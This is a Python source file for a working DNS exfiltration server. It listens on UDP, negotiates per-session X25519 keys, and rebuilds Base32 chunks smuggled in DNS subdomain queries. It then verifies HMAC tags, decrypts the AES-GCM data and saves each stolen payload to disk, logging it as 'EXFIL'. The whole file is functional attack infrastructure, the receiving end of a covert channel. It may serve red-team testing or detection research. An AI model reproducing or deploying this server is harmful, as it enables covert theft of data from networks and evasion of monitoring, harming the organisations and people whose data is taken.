#!/usr/bin/env python3
"""
Module Name: server.py

Description:
    DNS exfiltration server with per-session ephemeral ECDH key exchange,
    AES-GCM decryption, Base32 decoding, and HMAC verification.

    - Generates a fresh X25519 keypair for each client session (true PFS).
    - Returns the server's ephemeral public key as a TXT record response.
    - Derives per-session AES and HMAC keys via ECDH + HKDF.
    - Collects Base32-encoded chunks, decodes, verifies HMAC, decrypts AES-GCM.

Author: John Burns
Date: 2025-05-02
Version: 3.0 (Per-session ephemeral keys)
"""

import argparse
import base64
import hashlib
import hmac
import logging
import os
import socket
import threading
import time
from collections import defaultdict

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey, Ed25519PublicKey
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from dnslib import DNSRecord, RR, QTYPE, A, TXT

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger('server')

# === Session State ===
_session_lock = threading.Lock()
fragments_by_id = defaultdict(dict)
last_seen = defaultdict(lambda: time.time())
shared_keys = {}
session_server_pubkeys = {}
session_auth_status = {}

# === Authentication State ===
_server_signing_key = None
_trusted_clients = {}  # fingerprint_hex -> Ed25519PublicKey

# === Rate Limiting ===
_rate_lock = threading.Lock()
_ip_timestamps = defaultdict(list)
RATE_LIMIT_WINDOW = 60
RATE_LIMIT_MAX = 200

def is_rate_limited(ip: str) -> bool:
    """Return True if the given IP has exceeded the per-window request limit."""
    now = time.time()
    with _rate_lock:
        ts = _ip_timestamps[ip]
        _ip_timestamps[ip] = [t for t in ts if now - t < RATE_LIMIT_WINDOW]
        if len(_ip_timestamps[ip]) >= RATE_LIMIT_MAX:
            return True
        _ip_timestamps[ip].append(now)
        return False


# === Authentication Utilities ===
def load_signing_key(path):
    """Load an Ed25519 private key from a raw 32-byte seed file."""
    with open(path, 'rb') as f:
        seed = f.read()
    return Ed25519PrivateKey.from_private_bytes(seed)


def load_identity_pubkey(path):
    """Load an Ed25519 public key from a raw 32-byte file."""
    with open(path, 'rb') as f:
        pub_bytes = f.read()
    return Ed25519PublicKey.from_public_bytes(pub_bytes)


def compute_fingerprint(pub_key):
    """Compute 8-byte fingerprint = SHA256(raw_pubkey)[:8]."""
    pub_bytes = pub_key.public_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw
    )
    return hashlib.sha256(pub_bytes).digest()[:8]


def load_trusted_clients(directory):
    """Load all .pub files from directory, index by fingerprint hex."""
    trusted = {}
    if not os.path.isdir(directory):
        logger.warning(f"Trusted clients directory not found: {directory}")
        return trusted
    for fname in os.listdir(directory):
        if not fname.endswith('.pub'):
            continue
        path = os.path.join(directory, fname)
        try:
            pub_key = load_identity_pubkey(path)
            fp = compute_fingerprint(pub_key)
            trusted[fp] = pub_key
            fp_hex = fp.hex()
            logger.info(f"Loaded trusted client key: {fname} (fingerprint={fp_hex})")
        except Exception as e:
            logger.warning(f"Failed to load {path}: {e}")
    return trusted


# === Cryptographic Utilities ===
def derive_shared_key(server_priv, client_pub_bytes):
    """
    Derive per-session AES and HMAC keys via ECDH and HKDF.
    Returns (aes_key, hmac_key).
    """
    client_pub = x25519.X25519PublicKey.from_public_bytes(client_pub_bytes)
    shared_secret = server_priv.exchange(client_pub)
    material = HKDF(algorithm=hashes.SHA256(), length=48, salt=None, info=b'dns-exfil').derive(shared_secret)
    logger.debug("Derived shared key material")
    return material[:32], material[32:]


def decrypt_aes_gcm(aes_key, blob):
    """
    Decrypt AES-GCM blob (nonce||ciphertext+tag) and return plaintext.
    """
    nonce = blob[:12]
    ciphertext = blob[12:]
    return AESGCM(aes_key).decrypt(nonce, ciphertext, associated_data=None)


# === Base32 & HMAC ===
def pad_base32_string(b32_string):
    """
    Add '=' padding to Base32 string so its length is a multiple of 8.
    """
    pad_len = (8 - len(b32_string) % 8) % 8
    return b32_string.upper() + ('=' * pad_len)


def decode_and_split(blob_b32):
    """
    Decode Base32-encoded blob and split into payload and HMAC tag.
    Returns (payload_bytes, tag_bytes) or (None, None) on error.
    """
    try:
        raw = base64.b32decode(blob_b32)
    except Exception as e:
        logger.error(f"Base32 decode failed: {e}")
        return None, None

    if len(raw) < 32:
        logger.error("Decoded data too short for HMAC tag")
        return None, None

    return raw[:-32], raw[-32:]


def verify_hmac(payload, tag, hmac_key):
    """
    Compute and compare HMAC-SHA256 tag for payload using hmac_key.
    Returns True if valid.
    """
    expected = hmac.new(hmac_key, payload, hashlib.sha256).digest()
    logger.debug(f"Expected HMAC: {expected.hex()}")
    logger.debug(f"Received HMAC: {tag.hex()}")
    if not hmac.compare_digest(expected, tag):
        logger.error("HMAC verification FAILED")
        return False

    logger.info("HMAC verification succeeded")
    return True


# === DNS Helpers ===
def send_dns_response(data, addr, sock):
    """
    Send a minimal DNS A response (192.0.2.1) for given request.
    """
    req = DNSRecord.parse(data)
    reply = req.reply()
    reply.add_answer(RR(req.q.qname, QTYPE.A, rdata=A('192.0.2.1'), ttl=60))
    sock.sendto(reply.pack(), addr)


# === Main Request Logic ===
def handle_key_exchange(identifier, payload):
    """
    Generate an ephemeral server keypair for this session, derive shared keys,
    and return the server's ephemeral public key bytes (optionally signed).

    Idempotent: if session already has keys, returns cached response.

    Payload decoding determines authentication:
      - 32 bytes:  unauthenticated (X25519 pubkey only)
      - 104 bytes: authenticated (X25519 pubkey + Ed25519 sig + 8-byte fingerprint)
    """
    with _session_lock:
        if identifier in shared_keys:
            return session_server_pubkeys[identifier]

    # Decode client payload from Base32
    b32 = payload.replace('.', '')
    padded = pad_base32_string(b32)
    decoded = base64.b32decode(padded)

    client_authenticated = False
    if len(decoded) == 104:
        # Authenticated payload: pubkey(32) + sig(64) + fingerprint(8)
        client_pub_bytes = decoded[:32]
        client_sig = decoded[32:96]
        client_fp = decoded[96:104]

        if client_fp in _trusted_clients:
            client_identity_key = _trusted_clients[client_fp]
            try:
                client_identity_key.verify(client_sig, client_pub_bytes)
                client_authenticated = True
                logger.info(f"[{identifier}] Client identity VERIFIED — TRUSTED (fingerprint={client_fp.hex()})")
            except Exception:
                logger.warning(f"[{identifier}] Client signature verification FAILED (fingerprint={client_fp.hex()}) — UNAUTHENTICATED")
        else:
            logger.warning(f"[{identifier}] Unknown client fingerprint {client_fp.hex()} — UNAUTHENTICATED")
    elif len(decoded) == 32:
        client_pub_bytes = decoded
        logger.info(f"[{identifier}] Unauthenticated key exchange (no client signature)")
    else:
        logger.error(f"[{identifier}] Invalid key exchange payload length: {len(decoded)}")
        client_pub_bytes = decoded[:32]

    # Generate ephemeral server keypair
    server_priv = x25519.X25519PrivateKey.generate()
    server_pub_bytes = server_priv.public_key().public_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw
    )

    # Build response: sign if server has signing key AND client sent auth payload
    if _server_signing_key and len(decoded) == 104:
        server_sig = _server_signing_key.sign(server_pub_bytes)
        response_bytes = server_pub_bytes + server_sig  # 32 + 64 = 96 bytes
    else:
        response_bytes = server_pub_bytes

    # Derive shared keys
    aes_key, hmac_key = derive_shared_key(server_priv, client_pub_bytes)

    auth_status = "TRUSTED" if client_authenticated else "UNAUTHENTICATED"

    with _session_lock:
        # Double-check after acquiring lock (another thread may have beaten us)
        if identifier in shared_keys:
            return session_server_pubkeys[identifier]
        shared_keys[identifier] = (aes_key, hmac_key)
        session_server_pubkeys[identifier] = response_bytes
        session_auth_status[identifier] = auth_status

    logger.info(f"[{identifier}] Ephemeral session keys established (auth={auth_status})")
    return response_bytes


def handle_data_chunk(identifier, index, total, payload, args, sock, addr):
    """
    Store payload chunk, and when all received, assemble and process.
    """
    with _session_lock:
        fragments_by_id[identifier][int(index)] = payload
        last_seen[identifier] = time.time()
        received = len(fragments_by_id[identifier])

    if received == int(total):
        with _session_lock:
            b32_str = ''.join(fragments_by_id[identifier][i] for i in sorted(fragments_by_id[identifier]))
            aes_key, hmac_key = shared_keys.get(identifier, (None, None))
        padded = pad_base32_string(b32_str)
        payload_bytes, tag = decode_and_split(padded)
        if payload_bytes is None:
            return

        if not verify_hmac(payload_bytes, tag, hmac_key):
            return

        try:
            plaintext = decrypt_aes_gcm(aes_key, payload_bytes)
            logger.info(f"[{identifier}] Decryption succeeded, length={len(plaintext)} bytes")
        except Exception as e:
            logger.error(f"[{identifier}] AES-GCM decrypt failed: {e}")
            return

        with _session_lock:
            auth_status = session_auth_status.get(identifier, "UNAUTHENTICATED")

        out_dir = args.output_dir
        os.makedirs(out_dir, exist_ok=True)
        file_path = os.path.join(out_dir, f"{identifier}.bin")
        with open(file_path, 'wb') as f:
            f.write(plaintext)
        logger.info(
            f"EXFIL session_id={identifier} chunks={total} "
            f"plaintext_bytes={len(plaintext)} auth={auth_status} output={file_path}"
        )


def handle_request(data, addr, sock, args):
    """
    Main DNS packet handler: routes key exchange (TXT) and data chunks (A).
    """
    client_ip = addr[0]
    if is_rate_limited(client_ip):
        logger.warning(f"Rate limit exceeded for {client_ip}, dropping request")
        return

    req = DNSRecord.parse(data)
    qname = str(req.q.qname).rstrip('.')
    qtype = req.q.qtype

    if not qname.endswith(args.domain):
        return

    # Parse subdomain: <id>-<idx>-<total>-<payload>.<domain>
    prefix = qname[:-(len(args.domain) + 1)]
    parts = prefix.split('-', 3)
    if len(parts) != 4:
        return

    identifier, index, total, payload = parts

    if index == '0' and total == '0':
        # Key exchange: client sends pubkey, server responds with its ephemeral pubkey
        response_bytes = handle_key_exchange(identifier, payload)

        # Respond with TXT record containing Base32-encoded response (pubkey or pubkey+sig)
        server_pub_b32 = base64.b32encode(response_bytes).decode('ascii').rstrip('=')
        reply = req.reply()
        reply.add_answer(
            RR(req.q.qname, QTYPE.TXT, rdata=TXT(server_pub_b32), ttl=0)
        )
        sock.sendto(reply.pack(), addr)
    else:
        # Data chunks
        handle_data_chunk(identifier, index, total, payload, args, sock, addr)
        send_dns_response(data, addr, sock)


# === Cleanup Thread ===
def cleanup_stale(ttl=600, interval=60):
    """
    Periodically remove sessions idle longer than TTL.
    """
    while True:
        now = time.time()
        with _session_lock:
            stale = [ident for ident, ts in last_seen.items() if now - ts > ttl]
            for ident in stale:
                fragments_by_id.pop(ident, None)
                shared_keys.pop(ident, None)
                session_server_pubkeys.pop(ident, None)
                session_auth_status.pop(ident, None)
                last_seen.pop(ident, None)
                logger.info(f"[{ident}] Session expired and cleaned up")
        time.sleep(interval)


def start_server(args):
    """
    Initialize server and begin listening. No key files needed.
    """
    thread = threading.Thread(target=cleanup_stale, daemon=True)
    thread.start()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', args.port))
    sock.settimeout(1)
    logger.info(f"Listening on UDP/{args.port}...")

    try:
        while True:
            try:
                data, addr = sock.recvfrom(4096)
                threading.Thread(target=handle_request, args=(data, addr, sock, args), daemon=True).start()
            except socket.timeout:
                continue
    except KeyboardInterrupt:
        logger.info("Shutting down server")
    finally:
        sock.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="DNS Exfiltration Server (Ephemeral ECDH + AES-GCM + HMAC)")
    parser.add_argument('--port', type=int, default=5300)
    parser.add_argument('--output-dir', default='output')
    parser.add_argument('--domain', default='xf.example.com')
    parser.add_argument('--rate-limit-window', type=int, default=60,
                        help='Rate limit window in seconds (default: 60)')
    parser.add_argument('--rate-limit-max', type=int, default=200,
                        help='Max requests per IP per window (default: 200)')
    parser.add_argument('--signing-key', default=None,
                        help='Path to server Ed25519 private key for authentication')
    parser.add_argument('--trusted-clients-dir', default=None,
                        help='Directory containing trusted client .pub files')
    args = parser.parse_args()

    RATE_LIMIT_WINDOW = args.rate_limit_window
    RATE_LIMIT_MAX = args.rate_limit_max

    if args.signing_key:
        _server_signing_key = load_signing_key(args.signing_key)
        logger.info(f"Loaded server signing key from {args.signing_key}")
    if args.trusted_clients_dir:
        _trusted_clients.update(load_trusted_clients(args.trusted_clients_dir))
        logger.info(f"Loaded {len(_trusted_clients)} trusted client key(s)")

    start_server(args)
